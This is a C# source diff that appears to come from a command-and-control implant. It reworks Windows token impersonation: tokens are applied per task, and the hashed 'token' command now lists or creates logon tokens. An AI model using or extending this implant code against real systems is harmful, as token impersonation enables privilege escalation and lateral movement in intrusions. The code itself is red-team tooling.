@@ -64,7 +64,10 @@ namespace Athena.Commands
             Console.WriteLine(job.task.parameters);
 
 #if WINBUILD
-            await this.tokenHandler.ThreadImpersonate();
+            if(task.token is not null)
+            {
+                await this.tokenHandler.ThreadImpersonate(task.token);
+            }
 #endif
             switch (job.task.command.ToHash())
             {
@@ -157,35 +160,15 @@ namespace Athena.Commands
 #if WINBUILD
                 case "94A08DA1FECBB6E8B46990538C7B50B2": //token
                     var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
-                    string action = ((string)tokenInfo["action"]);
-                    Console.WriteLine(action);
-
-                    if (action.IsEqualTo("76EA0BEBB3C22822B4F0DD9C9FD021C5")) //create
-                    {
-                        this.responseResults.Add(await this.tokenHandler.CreateToken(job));
-                    }
-                    else if (action.IsEqualTo("10AE9FC7D453B0DD525D0EDF2EDE7961")) //list
+                    if (String.IsNullOrEmpty((string)tokenInfo["username"]))
                     {
                         this.responseResults.Add(await this.tokenHandler.ListTokens(job));
                     }
-                    else if (action.IsEqualTo("7581CD24E6B3486B70B67D0434FD9DDC")) //impersonate
-                    {
-                        this.responseResults.Add(await this.tokenHandler.SetToken(job));
-                    }
-                    else if (action.IsEqualTo("4BC48A3C9AC7468D2D5D1A6FB5F87654")) //revert
-                    {
-                        this.responseResults.Add(await this.tokenHandler.RevertToSelf(job));
-                    }
                     else
                     {
-                        this.responseResults.Add(new ResponseResult()
-                        {
-                            user_output = "Invalid action",
-                            completed = "true",
-                            task_id = job.task.id,
-                            status = "error"
-                        });
+                        this.responseResults.Add(await this.tokenHandler.CreateToken(job));
                     }
+
                     this.activeJobs.Remove(task.id, out _);
                     break;
 #endif
@@ -208,7 +191,10 @@ namespace Athena.Commands
                     break;
             }
 #if WINBUILD
-            await this.tokenHandler.ThreadRevert();
+            if (task.token is not null)
+            {
+                await this.tokenHandler.ThreadRevert();
+            }
 #endif
         }
         /// <summary>
